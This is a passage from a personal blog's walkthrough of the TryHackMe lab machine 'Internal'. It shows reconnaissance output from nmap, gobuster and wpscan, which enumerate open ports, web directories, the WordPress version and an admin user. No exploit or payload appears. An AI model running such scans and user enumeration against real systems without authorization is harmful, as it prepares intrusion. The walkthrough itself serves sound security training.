<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>Internal - TryHackMe - THM Walkthrough :: Umar_0x01 â€“ Pentester | Programmer | Your average sakurity guy ( Í¡~ ÍœÊ– Í¡Â°)</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="IP: 10.10.25.58
Host: internal.thm
 Enumeration Let&amp;rsquo;s start with the nmap full port scan and see the open ports
Nmap full port scan â”Œâ”€â”€(rootðŸ’€b0x)-[/mnt/hgfs/THM/Internal] [7/117] â””â”€# nmap -p- -v -iL ip -oN nmapFullPort.nmap  Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-07 13:15 PKT Initiating Ping Scan at 13:15 Scanning 10.10.25.58 [4 ports] Completed Ping Scan at 13:15, 0.22s elapsed (1 total hosts) Initiating SYN Stealth Scan at 13:15 Scanning internal."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://umar0x01.sh/post/internal-thm/" />





<link rel="stylesheet" href="https://umar0x01.sh/assets/style.css">

<link rel="stylesheet" href="https://umar0x01.sh/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://umar0x01.sh/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="https://umar0x01.sh/img/favicon.png">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Internal - TryHackMe - THM Walkthrough"/>
<meta name="twitter:description" content="Walkthrough of the machine Internal on TryHackMe - https://tryhackme.com/room/internal"/>



<meta property="og:title" content="Internal - TryHackMe - THM Walkthrough" />
<meta property="og:description" content="Walkthrough of the machine Internal on TryHackMe - https://tryhackme.com/room/internal" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://umar0x01.sh/post/internal-thm/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-04-07T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-04-07T00:00:00&#43;00:00" />








<link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/img/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/img/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">




  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">$ cd /home/umar_0x01/</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/anime">Anime</a></li>
        
      
        
          <li><a href="/archive">Archive</a></li>
        
      
        
          <li><a href="https://pentestlabs.gitbook.io">PentestLabs</a></li>
        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/anime">Anime</a></li>
      
    
      
        <li><a href="/archive">Archive</a></li>
      
    
      
        <li><a href="https://pentestlabs.gitbook.io">PentestLabs</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title"><a href="https://umar0x01.sh/post/internal-thm/">Internal - TryHackMe - THM Walkthrough</a></h1>
    <div class="post-meta">
      
        <span class="post-date">
          2021-04-07
        </span>

        
          
        
      

      <span class="post-author">â€” Written by Umar_0x01</span>
      
    </div>

    

    
      <figure class="post-cover">
        
          <img src="https://umar0x01.sh/img/internal-thm/Pasted%20image%2020210407143622.png" alt="Internal - TryHackMe - THM Walkthrough" />
        

        
      </figure>
    

    <div class="post-content">
      
      <hr>
<p><strong>IP:</strong> 10.10.25.58</p>
<p><strong>Host:</strong> internal.thm</p>
<hr>
<h2 id="enumeration">Enumeration</h2>
<p>Let&rsquo;s start with the nmap full port scan and see the open ports</p>
<h3 id="nmap-full-port-scan">Nmap full port scan</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">â”Œâ”€â”€</span>(root<span style="color:#960050;background-color:#1e0010">ðŸ’€</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Internal]                                                                                                                                                                     [<span style="color:#ae81ff">7</span><span style="color:#f92672">/</span><span style="color:#ae81ff">117</span>]
<span style="color:#960050;background-color:#1e0010">â””â”€</span><span style="color:#75715e"># nmap -p- -v -iL ip -oN nmapFullPort.nmap                                                                                                                                                                       </span>
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#f92672">//</span>nmap<span style="color:#f92672">.</span>org ) at <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">07</span> <span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">15</span> PKT                                          
Initiating Ping Scan at <span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">15</span>                       
Scanning <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">25.58</span> [<span style="color:#ae81ff">4</span> ports]                                                                           
Completed Ping Scan at <span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0.22</span>s elapsed (<span style="color:#ae81ff">1</span> total hosts)                                              
Initiating SYN Stealth Scan at <span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">15</span>                
Scanning internal<span style="color:#f92672">.</span>thm (<span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">25.58</span>) [<span style="color:#ae81ff">65535</span> ports]                                                        
Discovered open port <span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">25.58</span>          
Discovered open port <span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">25.58</span>         
SYN Stealth Scan Timing: About <span style="color:#ae81ff">96.47</span><span style="color:#f92672">%</span> done; ETC: <span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">34</span> (<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">40</span> remaining)                               
Completed SYN Stealth Scan at <span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">1181.13</span>s elapsed (<span style="color:#ae81ff">65535</span> total ports)                                
Nmap scan report <span style="color:#66d9ef">for</span> internal<span style="color:#f92672">.</span>thm (<span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">25.58</span>)                                                          
Host <span style="color:#f92672">is</span> up (<span style="color:#ae81ff">0.19</span>s latency)<span style="color:#f92672">.</span>                         
Not shown: <span style="color:#ae81ff">65533</span> closed ports                       
PORT   STATE SERVICE                                
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp open  ssh                                    
<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp open  http                                   

Read data files from: <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/../</span>share<span style="color:#f92672">/</span>nmap        
Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned <span style="color:#f92672">in</span> <span style="color:#ae81ff">1181.51</span> seconds                                           
           Raw packets sent: <span style="color:#ae81ff">74888</span> (<span style="color:#ae81ff">3.295</span>MB) <span style="color:#f92672">|</span> Rcvd: <span style="color:#ae81ff">110353</span> (<span style="color:#ae81ff">9.720</span>MB)                                    

</code></pre></div><h3 id="enumerating-http-web-server-port-80">Enumerating HTTP Web Server (Port 80)</h3>
<p>Taking a look at <code>port 80</code>, we can see that <code>/</code> points to Apache&rsquo;s default page. Let&rsquo;s try running gobuster against the web server:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">â”Œâ”€â”€</span>(root<span style="color:#960050;background-color:#1e0010">ðŸ’€</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Internal]                                                                                                                                                                            
<span style="color:#960050;background-color:#1e0010">â””â”€</span><span style="color:#75715e"># gobuster dir -u http://10.10.245.7 -w /usr/share/wordlists/dirb/big.txt -k -e -b 404 -t 100                                                                                       1 â¨¯                          </span>
<span style="color:#f92672">===============================================================</span>                                                                                                                                                    
Gobuster v3<span style="color:#f92672">.</span><span style="color:#ae81ff">1.0</span>                                                                                                                                                                                                    
by OJ Reeves (<span style="color:#a6e22e">@TheColonial</span>) <span style="color:#f92672">&amp;</span> Christian Mehlmauer (<span style="color:#a6e22e">@firefart</span>)                                                                                                                                                      
<span style="color:#f92672">===============================================================</span>                                                                                                                                                    
[<span style="color:#f92672">+</span>] Url:                     http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">245.7</span>                                                                                                                                                                    
[<span style="color:#f92672">+</span>] Method:                  GET                                                                                                                                                                                   
[<span style="color:#f92672">+</span>] Threads:                 <span style="color:#ae81ff">100</span>                                                                                                                                                                                   [<span style="color:#f92672">+</span>] Wordlist:                <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>dirb<span style="color:#f92672">/</span>big<span style="color:#f92672">.</span>txt                                                                                                                                                     [<span style="color:#f92672">+</span>] Negative Status codes:   <span style="color:#ae81ff">404</span>                                                                                                                                                                                   
[<span style="color:#f92672">+</span>] User Agent:              gobuster<span style="color:#f92672">/</span><span style="color:#ae81ff">3.1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>                                                                                                                                                                        
[<span style="color:#f92672">+</span>] Expanded:                true                                                                                                                                                                                  
[<span style="color:#f92672">+</span>] Timeout:                 <span style="color:#ae81ff">10</span>s                                                                                                                                                                                   
<span style="color:#f92672">===============================================================</span>                                                                                                                                                    
<span style="color:#ae81ff">2021</span><span style="color:#f92672">/</span><span style="color:#ae81ff">04</span><span style="color:#f92672">/</span><span style="color:#ae81ff">07</span> <span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">05</span>:<span style="color:#ae81ff">27</span> Starting gobuster <span style="color:#f92672">in</span> directory enumeration mode                                                                                                                                                
<span style="color:#f92672">===============================================================</span>                                                                                                                                                    
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">245.7</span><span style="color:#f92672">/.</span>htpasswd            (Status: <span style="color:#ae81ff">403</span>) [Size: <span style="color:#ae81ff">276</span>]                                                                                                                                                  
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">245.7</span><span style="color:#f92672">/.</span>htaccess            (Status: <span style="color:#ae81ff">403</span>) [Size: <span style="color:#ae81ff">276</span>]                                                                                                                                                  
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">245.7</span><span style="color:#f92672">/</span>blog                 (Status: <span style="color:#ae81ff">301</span>) [Size: <span style="color:#ae81ff">309</span>] [<span style="color:#f92672">--&gt;</span> http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">245.7</span><span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>]                                                                                                                   
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">245.7</span><span style="color:#f92672">/</span>javascript           (Status: <span style="color:#ae81ff">301</span>) [Size: <span style="color:#ae81ff">315</span>] [<span style="color:#f92672">--&gt;</span> http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">245.7</span><span style="color:#f92672">/</span>javascript<span style="color:#f92672">/</span>]                                                                                                             
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">245.7</span><span style="color:#f92672">/</span>phpmyadmin           (Status: <span style="color:#ae81ff">301</span>) [Size: <span style="color:#ae81ff">315</span>] [<span style="color:#f92672">--&gt;</span> http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">245.7</span><span style="color:#f92672">/</span>phpmyadmin<span style="color:#f92672">/</span>]                                                                                                             
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">245.7</span><span style="color:#f92672">/</span>server<span style="color:#f92672">-</span>status        (Status: <span style="color:#ae81ff">403</span>) [Size: <span style="color:#ae81ff">276</span>]                                                                                                                                                  
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">245.7</span><span style="color:#f92672">/</span>wordpress            (Status: <span style="color:#ae81ff">301</span>) [Size: <span style="color:#ae81ff">314</span>] [<span style="color:#f92672">--&gt;</span> http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">245.7</span><span style="color:#f92672">/</span>wordpress<span style="color:#f92672">/</span>]                                                                                                              
                                                                                                                                                                                                                   
<span style="color:#f92672">===============================================================</span>                                                                                                                                                    
<span style="color:#ae81ff">2021</span><span style="color:#f92672">/</span><span style="color:#ae81ff">04</span><span style="color:#f92672">/</span><span style="color:#ae81ff">07</span> <span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">06</span>:<span style="color:#ae81ff">13</span> Finished                                                                                                                                                                                       
<span style="color:#f92672">===============================================================</span>                                                                                                                                                    
</code></pre></div><p>&ndash;</p>
<p>Visiting <code>/blog/</code> we can find that it&rsquo;s hosting wordpress. Let&rsquo;s run wpscan and see what we can enumerate.</p>
<h4 id="wpscan-blog">WpScan (<code>/blog/</code>)</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">â”Œâ”€â”€</span>(root<span style="color:#960050;background-color:#1e0010">ðŸ’€</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Internal]                                                                  
<span style="color:#960050;background-color:#1e0010">â””â”€</span><span style="color:#75715e"># wpscan --url http://internal.thm/blog/ -e u   </span>
_______________________________________________________________                                      
         __          _______   _____                                                                                                                                                                               
         \ \        <span style="color:#f92672">/</span> <span style="color:#f92672">/</span>  __ \ <span style="color:#f92672">/</span> ____<span style="color:#f92672">|</span>
          \ \  <span style="color:#f92672">/</span>\  <span style="color:#f92672">/</span> <span style="color:#f92672">/|</span> <span style="color:#f92672">|</span>__) <span style="color:#f92672">|</span> (___   ___  __ _ _ __ <span style="color:#960050;background-color:#1e0010">Â®</span>
           \ \<span style="color:#f92672">/</span>  \<span style="color:#f92672">/</span> <span style="color:#f92672">/</span> <span style="color:#f92672">|</span>  ___<span style="color:#f92672">/</span> \___ \ <span style="color:#f92672">/</span> __<span style="color:#f92672">|/</span> _<span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#f92672">|</span> <span style="color:#e6db74">&#39;_ </span><span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span><span style="color:#e6db74">            \  /\  /  | |     ____) | (__| (_| | | | |</span>
             \<span style="color:#f92672">/</span>  \<span style="color:#f92672">/</span>   <span style="color:#f92672">|</span>_<span style="color:#f92672">|</span>    <span style="color:#f92672">|</span>_____<span style="color:#f92672">/</span> \___<span style="color:#f92672">|</span>\__,_<span style="color:#f92672">|</span>_<span style="color:#f92672">|</span> <span style="color:#f92672">|</span>_<span style="color:#f92672">|</span>

         WordPress Security Scanner by the WPScan Team
                         Version <span style="color:#ae81ff">3.8</span><span style="color:#f92672">.</span><span style="color:#ae81ff">17</span>
       Sponsored by Automattic <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>automattic<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>
       <span style="color:#a6e22e">@_WPScan_</span>, <span style="color:#a6e22e">@ethicalhack3r</span>, <span style="color:#a6e22e">@erwan_lr</span>, <span style="color:#a6e22e">@firefart</span>
_______________________________________________________________

[<span style="color:#f92672">+</span>] URL: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span> [<span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">25.58</span>]
[<span style="color:#f92672">+</span>] Started: Wed Apr  <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">17</span>:<span style="color:#ae81ff">35</span> <span style="color:#ae81ff">2021</span>

Interesting Finding(s):

[<span style="color:#f92672">+</span>] Headers
 <span style="color:#f92672">|</span> Interesting Entry: Server: Apache<span style="color:#f92672">/</span><span style="color:#ae81ff">2.4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">29</span> (Ubuntu) 
 <span style="color:#f92672">|</span> Found By: Headers (Passive Detection)
 <span style="color:#f92672">|</span> Confidence: <span style="color:#ae81ff">100</span><span style="color:#f92672">%</span>

[<span style="color:#f92672">+</span>] XML<span style="color:#f92672">-</span>RPC seems to be enabled: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>xmlrpc<span style="color:#f92672">.</span>php
 <span style="color:#f92672">|</span> Found By: Direct Access (Aggressive Detection)
 <span style="color:#f92672">|</span> Confidence: <span style="color:#ae81ff">100</span><span style="color:#f92672">%</span>
 <span style="color:#f92672">|</span> References:
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> http:<span style="color:#f92672">//</span>codex<span style="color:#f92672">.</span>wordpress<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>XML<span style="color:#f92672">-</span>RPC_Pingback_API
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>rapid7<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>db<span style="color:#f92672">/</span>modules<span style="color:#f92672">/</span>auxiliary<span style="color:#f92672">/</span>scanner<span style="color:#f92672">/</span>http<span style="color:#f92672">/</span>wordpress_ghost_scanner<span style="color:#f92672">/</span>
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>rapid7<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>db<span style="color:#f92672">/</span>modules<span style="color:#f92672">/</span>auxiliary<span style="color:#f92672">/</span>dos<span style="color:#f92672">/</span>http<span style="color:#f92672">/</span>wordpress_xmlrpc_dos<span style="color:#f92672">/</span>
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>rapid7<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>db<span style="color:#f92672">/</span>modules<span style="color:#f92672">/</span>auxiliary<span style="color:#f92672">/</span>scanner<span style="color:#f92672">/</span>http<span style="color:#f92672">/</span>wordpress_xmlrpc_login<span style="color:#f92672">/</span>
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>rapid7<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>db<span style="color:#f92672">/</span>modules<span style="color:#f92672">/</span>auxiliary<span style="color:#f92672">/</span>scanner<span style="color:#f92672">/</span>http<span style="color:#f92672">/</span>wordpress_pingback_access<span style="color:#f92672">/</span>

[<span style="color:#f92672">+</span>] WordPress readme found: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>readme<span style="color:#f92672">.</span>html
 <span style="color:#f92672">|</span> Found By: Direct Access (Aggressive Detection)
 <span style="color:#f92672">|</span> Confidence: <span style="color:#ae81ff">100</span><span style="color:#f92672">%</span>

[<span style="color:#f92672">+</span>] The external WP<span style="color:#f92672">-</span>Cron seems to be enabled: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>cron<span style="color:#f92672">.</span>php
 <span style="color:#f92672">|</span> Found By: Direct Access (Aggressive Detection)
 <span style="color:#f92672">|</span> Confidence: <span style="color:#ae81ff">60</span><span style="color:#f92672">%</span>
 <span style="color:#f92672">|</span> References:
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>iplocation<span style="color:#f92672">.</span>net<span style="color:#f92672">/</span>defend<span style="color:#f92672">-</span>wordpress<span style="color:#f92672">-</span>from<span style="color:#f92672">-</span>ddos
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>github<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>wpscanteam<span style="color:#f92672">/</span>wpscan<span style="color:#f92672">/</span>issues<span style="color:#f92672">/</span><span style="color:#ae81ff">1299</span>

[<span style="color:#f92672">+</span>] WordPress version <span style="color:#ae81ff">5.4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span> identified (Insecure, released on <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">06</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>
 <span style="color:#f92672">|</span> Found By: Rss Generator (Passive Detection)
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>index<span style="color:#f92672">.</span>php<span style="color:#f92672">/</span>feed<span style="color:#f92672">/</span>, <span style="color:#f92672">&lt;</span>generator<span style="color:#f92672">&gt;</span>https:<span style="color:#f92672">//</span>wordpress<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>v<span style="color:#f92672">=</span><span style="color:#ae81ff">5.4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">&lt;/</span>generator<span style="color:#f92672">&gt;</span>
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>index<span style="color:#f92672">.</span>php<span style="color:#f92672">/</span>comments<span style="color:#f92672">/</span>feed<span style="color:#f92672">/</span>, <span style="color:#f92672">&lt;</span>generator<span style="color:#f92672">&gt;</span>https:<span style="color:#f92672">//</span>wordpress<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>v<span style="color:#f92672">=</span><span style="color:#ae81ff">5.4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">&lt;/</span>generator<span style="color:#f92672">&gt;</span>

[<span style="color:#f92672">+</span>] WordPress theme <span style="color:#f92672">in</span> use: twentyseventeen
 <span style="color:#f92672">|</span> Location: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>content<span style="color:#f92672">/</span>themes<span style="color:#f92672">/</span>twentyseventeen<span style="color:#f92672">/</span>
 <span style="color:#f92672">|</span> Last Updated: <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">03</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span>T00:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00.000</span>Z
 <span style="color:#f92672">|</span> Readme: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>content<span style="color:#f92672">/</span>themes<span style="color:#f92672">/</span>twentyseventeen<span style="color:#f92672">/</span>readme<span style="color:#f92672">.</span>txt
 <span style="color:#f92672">|</span> [<span style="color:#960050;background-color:#1e0010">!</span>] The version <span style="color:#f92672">is</span> out of date, the latest version <span style="color:#f92672">is</span> <span style="color:#ae81ff">2.6</span>
 <span style="color:#f92672">|</span> Style URL: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>content<span style="color:#f92672">/</span>themes<span style="color:#f92672">/</span>twentyseventeen<span style="color:#f92672">/</span>style<span style="color:#f92672">.</span>css<span style="color:#960050;background-color:#1e0010">?</span>ver<span style="color:#f92672">=</span><span style="color:#ae81ff">20190507</span>
 <span style="color:#f92672">|</span> Style Name: Twenty Seventeen
 <span style="color:#f92672">|</span> Style URI: https:<span style="color:#f92672">//</span>wordpress<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>themes<span style="color:#f92672">/</span>twentyseventeen<span style="color:#f92672">/</span>
 <span style="color:#f92672">|</span> Description: Twenty Seventeen brings your site to life <span style="color:#66d9ef">with</span> header video <span style="color:#f92672">and</span> immersive featured images<span style="color:#f92672">.</span> With a fo<span style="color:#f92672">...</span>
 <span style="color:#f92672">|</span> Author: the WordPress team
 <span style="color:#f92672">|</span> Author URI: https:<span style="color:#f92672">//</span>wordpress<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>
 <span style="color:#f92672">|</span>
 <span style="color:#f92672">|</span> Found By: Css Style In Homepage (Passive Detection)
 <span style="color:#f92672">|</span>
 <span style="color:#f92672">|</span> Version: <span style="color:#ae81ff">2.3</span> (<span style="color:#ae81ff">80</span><span style="color:#f92672">%</span> confidence)
 <span style="color:#f92672">|</span> Found By: Style (Passive Detection)
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>content<span style="color:#f92672">/</span>themes<span style="color:#f92672">/</span>twentyseventeen<span style="color:#f92672">/</span>style<span style="color:#f92672">.</span>css<span style="color:#960050;background-color:#1e0010">?</span>ver<span style="color:#f92672">=</span><span style="color:#ae81ff">20190507</span>, Match: <span style="color:#e6db74">&#39;Version: 2.3&#39;</span>

[<span style="color:#f92672">+</span>] Enumerating Users (via Passive <span style="color:#f92672">and</span> Aggressive Methods)
 Brute Forcing Author IDs <span style="color:#f92672">-</span> Time: <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span> <span style="color:#f92672">&lt;=====================================================================================================================================&gt;</span> (<span style="color:#ae81ff">10</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">10</span>) <span style="color:#ae81ff">100.00</span><span style="color:#f92672">%</span> Time: <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>

[i] User(s) Identified:

[<span style="color:#f92672">+</span>] admin
 <span style="color:#f92672">|</span> Found By: Author Posts <span style="color:#f92672">-</span> Author Pattern (Passive Detection)
 <span style="color:#f92672">|</span> Confirmed By:
 <span style="color:#f92672">|</span>  Rss Generator (Passive Detection)
 <span style="color:#f92672">|</span>  Wp Json Api (Aggressive Detection)
 <span style="color:#f92672">|</span>   <span style="color:#f92672">-</span> http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>index<span style="color:#f92672">.</span>php<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>json<span style="color:#f92672">/</span>wp<span style="color:#f92672">/</span>v2<span style="color:#f92672">/</span>users<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>per_page<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&amp;</span>page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 <span style="color:#f92672">|</span>  Author Id Brute Forcing <span style="color:#f92672">-</span> Author Pattern (Aggressive Detection)
